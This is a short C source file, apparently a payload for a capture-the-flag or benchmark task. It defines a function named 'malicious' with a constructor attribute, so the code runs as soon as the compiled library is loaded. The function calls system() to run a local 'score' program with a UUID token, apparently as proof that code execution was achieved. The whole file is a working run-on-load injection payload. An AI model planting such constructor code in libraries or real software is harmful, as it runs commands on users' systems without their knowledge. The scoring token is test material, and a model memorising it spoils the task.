#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score c1104771-f6d9-4e6b-ba2b-39ff9fd5a03e");
}
